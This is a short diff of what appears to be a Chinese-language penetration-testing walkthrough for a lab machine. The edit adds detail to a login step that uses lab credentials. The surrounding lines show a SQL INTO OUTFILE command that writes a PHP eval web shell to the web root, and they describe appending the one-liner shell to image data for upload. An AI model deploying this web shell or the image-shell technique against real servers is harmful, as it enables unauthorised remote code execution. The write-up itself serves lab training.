@@ -528,4 +528,4 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 具有一句话木马功能的PHP语句插入在照片数据的最后处
 
 ### 6.2上传图片马
-使用口令biLLu：hEx\_it
+使用口令biLLu：hEx\_it登入index.php跳转到panel.php页面  
